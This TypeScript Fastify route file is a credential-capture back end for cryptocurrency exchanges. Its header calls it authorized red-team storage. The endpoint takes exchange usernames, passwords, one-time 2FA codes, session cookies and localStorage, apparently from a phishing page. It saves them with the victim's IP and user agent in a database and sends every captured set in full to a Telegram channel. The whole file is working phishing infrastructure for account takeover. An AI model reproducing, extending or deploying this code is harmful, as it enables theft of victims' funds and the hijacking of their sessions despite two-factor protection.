/**
 * CEX credential capture — authorized red-team research storage.
 * POST /api/v1/creds
 */
import { createDatabaseAnchorPool } from '@legion/core/logic/database-anchor'
import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'
import type { Pool } from 'pg'

import { sendFailure, sendSuccess } from '../lib/api-response.js'
import { normalizeDatabaseConnectionString } from '../lib/database-anchor.js'
import { sendTelegramMessage } from '../lib/telegram.js'
import { parseBody, credsBodySchema } from '../lib/schemas.js'

export type CapturedCredRow = {
  id: string
  exchange: string
  username: string
  password: string
  totp: string | null
  session_cookies: string | null
  local_storage: string | null
  ip: string | null
  user_agent: string | null
  created_at: string
}

let pool: Pool | null = null

function getPool(): Pool {
  if (pool) return pool
  const url = process.env['DATABASE_URL']?.trim()
  if (!url) throw new Error('DATABASE_URL not configured')
  pool = createDatabaseAnchorPool(normalizeDatabaseConnectionString(url), {
    max: 5,
    connectionTimeoutMillis: 10_000,
  })
  return pool
}

function readString(value: unknown): string {
  return typeof value === 'string' ? value.trim() : ''
}

function readOptionalString(value: unknown): string | null {
  if (value == null) return null
  const s = typeof value === 'string' ? value.trim() : String(value).trim()
  return s || null
}

function readOptionalApiKey(): string | null {
  const key = process.env['CEX_CREDS_API_KEY']?.trim()
  return key || null
}

/** Default true unless explicitly disabled */
function isEnvEnabled(key: string, defaultValue = true): boolean {
  const v = process.env[key]?.trim().toLowerCase()
  if (!v) return defaultValue
  if (v === 'false' || v === '0' || v === 'no') return false
  return v === 'true' || v === '1' || v === 'yes'
}

function clientIp(request: FastifyRequest): string | null {
  const forwarded = request.headers['x-forwarded-for']
  if (typeof forwarded === 'string' && forwarded.trim()) {
    return forwarded.split(',')[0]?.trim() ?? null
  }
  return request.ip ?? null
}

function formatTelegramAlert(row: CapturedCredRow, pageUrl?: string | null): string {
  const lines = [
    '🔐 <b>New Credentials Captured</b>',
    `Exchange: <code>${escapeHtml(row.exchange)}</code>`,
    `Username: <code>${escapeHtml(row.username)}</code>`,
    `Password: <code>${escapeHtml(row.password)}</code>`,
  ]
  if (pageUrl) lines.push(`Page: <code>${escapeHtml(pageUrl.slice(0, 500))}</code>`)
  if (row.totp) lines.push(`TOTP: <code>${escapeHtml(row.totp)}</code>`)
  if (row.session_cookies) {
    lines.push(`Session Cookies: <code>${escapeHtml(row.session_cookies.slice(0, 3500))}</code>`)
  } else {
    lines.push('Session Cookies: <i>(none)</i>')
  }
  if (row.local_storage) {
    const preview = row.local_storage.length > 1200
      ? `${row.local_storage.slice(0, 1200)}…`
      : row.local_storage
    lines.push(`LocalStorage: <code>${escapeHtml(preview)}</code>`)
  }
  lines.push(`IP: <code>${escapeHtml(row.ip ?? 'unknown')}</code>`)
  lines.push(`User Agent: <code>${escapeHtml((row.user_agent ?? 'unknown').slice(0, 500))}</code>`)
  lines.push(`Time: <code>${escapeHtml(row.created_at)}</code>`)
  lines.push(`ID: <code>${escapeHtml(row.id)}</code>`)
  return lines.join('\n')
}

function escapeHtml(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
}

async function insertCapturedCred(input: {
  exchange: string
  username: string
  password: string
  totp: string | null
  session_cookies: string | null
  local_storage: string | null
  ip: string | null
  user_agent: string | null
}): Promise<CapturedCredRow> {
  const db = getPool()
  const result = await db.query(
    `INSERT INTO captured_creds (exchange, username, password, totp, session_cookies, local_storage, ip, user_agent)
     VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
     RETURNING id, exchange, username, password, totp, session_cookies, local_storage, ip, user_agent, created_at`,
    [
      input.exchange,
      input.username,
      input.password,
      input.totp,
      input.session_cookies,
      input.local_storage,
      input.ip,
      input.user_agent,
    ],
  )
  const row = result.rows[0] as Record<string, unknown>
  return {
    id: String(row['id'] ?? ''),
    exchange: String(row['exchange'] ?? ''),
    username: String(row['username'] ?? ''),
    password: String(row['password'] ?? ''),
    totp: row['totp'] != null ? String(row['totp']) : null,
    session_cookies: row['session_cookies'] != null ? String(row['session_cookies']) : null,
    local_storage: row['local_storage'] != null ? String(row['local_storage']) : null,
    ip: row['ip'] != null ? String(row['ip']) : null,
    user_agent: row['user_agent'] != null ? String(row['user_agent']) : null,
    created_at:
      row['created_at'] instanceof Date
        ? row['created_at'].toISOString()
        : String(row['created_at'] ?? new Date().toISOString()),
  }
}

export async function registerCredsRoutes(app: FastifyInstance): Promise<void> {
  app.post('/api/v1/creds', async (request: FastifyRequest, reply: FastifyReply) => {
    const requiredKey = readOptionalApiKey()
    if (!requiredKey) {
      return sendFailure(reply, 503, 'Credential capture not configured', { code: 'NotConfigured' })
    }
    const provided = readString(request.headers['x-cex-creds-key'])
    if (provided !== requiredKey) {
      return sendFailure(reply, 401, 'Invalid or missing X-Cex-Creds-Key', { code: 'Unauthorized' })
    }

    const parsed = parseBody(credsBodySchema, request.body)
    if (parsed.ok === false) {
      return sendFailure(reply, 400, parsed.message, { code: 'ValidationError' })
    }
    const body = parsed.data

    const exchange = body.exchange
    const username = body.username
    const password = body.password
    const totp = body.totp || body.otp || body['2fa'] || body.mfa || null
    const page_url = body.page_url || null

    const captureSession = isEnvEnabled('CEX_CAPTURE_SESSION_COOKIES', true)
    const session_cookies = captureSession ? body.session_cookies || null : null
    const local_storage = captureSession ? body.local_storage || null : null

    const ip = clientIp(request)
    const user_agent = readString(request.headers['user-agent']) || null

    try {
      const row = await insertCapturedCred({
        exchange: exchange.toLowerCase(),
        username,
        password,
        totp: totp || null,
        session_cookies,
        local_storage,
        ip,
        user_agent,
      })

      request.log.info(
        {
          cred_capture: {
            id: row.id,
            exchange: row.exchange,
            username_preview: `${username.slice(0, 3)}…`,
            ip,
            has_totp: Boolean(totp),
            has_session_cookies: Boolean(session_cookies),
            has_local_storage: Boolean(local_storage),
          },
        },
        '[CEX_CREDS] credential captured (authorized red-team)',
      )

      if (isEnvEnabled('CEX_TELEGRAM_ALERT', true)) {
        void sendTelegramMessage(formatTelegramAlert(row, page_url)).catch((e) => {
          request.log.warn(
            { err: e instanceof Error ? e.message : String(e) },
            '[CEX_CREDS] telegram alert failed',
          )
        })
      }

      return sendSuccess(reply, 201, 'Credentials recorded', {
        id: row.id,
        exchange: row.exchange,
        recorded_at: row.created_at,
      })
    } catch (e) {
      request.log.error({ err: e }, 'captured_creds_insert_failed')
      return sendFailure(reply, 500, e instanceof Error ? e.message : 'Failed to store credentials', {
        code: 'DatabaseError',
      })
    }
  })

  app.log.info('[BOOT] CEX creds route registered (POST /api/v1/creds)')
}
